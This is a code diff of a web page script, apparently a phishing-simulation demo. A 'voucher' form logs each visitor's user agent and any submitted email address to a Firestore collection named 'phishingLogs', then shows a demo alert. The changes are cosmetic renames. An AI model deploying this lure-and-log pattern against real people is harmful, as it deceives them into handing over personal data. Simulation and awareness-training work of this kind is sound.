@@ -210,30 +210,31 @@
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
-    // Log visit on page load
+    // Log page visit on load with unknown email
     window.onload = async () => {
       try {
         await addDoc(collection(db, "phishingLogs"), {
-          email: "anonymous_visit",
+          email: "unknown",
           timestamp: serverTimestamp(),
           action: "Page visited",
           userAgent: navigator.userAgent
         });
-        console.log("Visit logged");
+        console.log("Page visit logged");
       } catch (error) {
-        console.error("Error logging visit:", error);
+        console.error("Error logging page visit:", error);
       }
     };
 
-    // Form submission handler
+    // Handle form submission
     const form = document.getElementById("voucherForm");
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
-      const email = document.getElementById("email").value;
+      const emailInput = document.getElementById("email");
+      const userEmail = emailInput.value;
 
       try {
         await addDoc(collection(db, "phishingLogs"), {
-          email,
+          email: userEmail,
           timestamp: serverTimestamp(),
           action: "Form submitted",
           userAgent: navigator.userAgent
@@ -241,7 +242,7 @@
         alert("Voucher claimed! (This is a demo)");
         form.reset();
       } catch (err) {
-        console.error("Error logging submission:", err);
+        console.error("Error logging form submission:", err);
       }
     });
   </script>
